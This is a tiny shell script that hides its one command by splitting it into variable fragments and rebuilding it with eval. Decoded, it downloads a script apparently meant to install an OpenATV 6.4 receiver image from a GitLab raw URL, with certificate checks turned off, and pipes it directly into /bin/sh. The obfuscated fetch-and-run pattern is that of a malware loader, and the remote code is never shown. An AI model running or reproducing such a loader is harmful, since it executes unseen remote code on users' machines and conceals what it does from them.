z="
";Bz='  --';Sz='main';Tz='/ope';Oz='l1/i';Lz='com/';cz=' 0';Pz='mage';az='sh';Gz='cate';Xz='-O -';bz='exit';Cz='no-c';Iz='ps:/';Qz='s/-/';Kz='lab.';Az='wget';Rz='raw/';Dz='heck';Mz='emil';Nz='nabi';Zz='bin/';Jz='/git';Fz='tifi';Vz='-6.4';Wz='.sh ';Ez='-cer';Hz=' htt';Uz='natv';Yz=' | /';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"